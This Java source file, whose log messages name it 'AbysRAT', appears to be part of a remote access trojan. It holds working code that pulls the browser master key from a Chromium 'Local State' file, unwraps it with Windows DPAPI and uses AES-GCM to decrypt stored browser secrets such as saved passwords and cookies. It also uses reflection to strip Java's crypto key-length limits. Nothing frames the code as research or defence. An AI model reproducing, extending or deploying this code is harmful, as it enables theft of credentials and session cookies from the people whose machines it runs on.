package dev.nfo.utils;

import java.io.File;
import java.io.FileReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;

public class Utils {
    
    public static void bypassKeyRestriction() {
        try {
            int maxKeyLength = Cipher.getMaxAllowedKeyLength("AES");
            System.out.println("[AbysRAT] Max allowed key length before bypass: " + maxKeyLength);
            
            if (maxKeyLength < 256) {
                Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                Constructor<?> con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissionCollection = con.newInstance();
                Field f = aClass.getDeclaredField("all_allowed");
                f.setAccessible(true);
                f.setBoolean(allPermissionCollection, true);

                aClass = Class.forName("javax.crypto.CryptoPermissions");
                con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissions = con.newInstance();
                f = aClass.getDeclaredField("perms");
                f.setAccessible(true);
                ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                aClass = Class.forName("javax.crypto.JceSecurityManager");
                f = aClass.getDeclaredField("defaultPolicy");
                f.setAccessible(true);
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                f.set(null, allPermissions);
                
                maxKeyLength = Cipher.getMaxAllowedKeyLength("AES");
                System.out.println("[AbysRAT] Max allowed key length after bypass: " + maxKeyLength);
            } else {
                System.out.println("[AbysRAT] AES-256 already supported, bypass not needed");
            }
        } catch (Exception e) {
            System.err.println("[AbysRAT] Erro ao fazer bypass de restrição de chave: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    public static byte[] getKey(File localState) throws Exception {
        if (!localState.exists()) {
            throw new Exception("Local State file not found");
        }
        
        try {
            JsonObject localStateJson = (JsonObject) new Gson().fromJson(new FileReader(localState), JsonObject.class);
            byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();
            encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);
            encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyBytes);
        } catch (Exception e) {
            throw new Exception("DPAPI decryption failed: " + e.getMessage());
        }
    }
    
    public static String decrypt(byte[] encryptedData, byte[] key) {
        try {
            if (encryptedData == null || encryptedData.length < 15) {
                System.err.println("[AbysRAT] Dados criptografados muito curtos: " + (encryptedData == null ? "null" : encryptedData.length));
                return null;
            }
            if (key == null || key.length == 0) {
                System.err.println("[AbysRAT] Chave inválida");
                return null;
            }
            
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);
            byte[] decrypted = cipher.doFinal(payload);
            String result = new String(decrypted, StandardCharsets.UTF_8);
            System.out.println("[AbysRAT] Descriptografia bem-sucedida! Tamanho do resultado: " + result.length());
            return result;
        } catch (Exception e) {
            System.err.println("[AbysRAT] Erro na descriptografia: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }
}
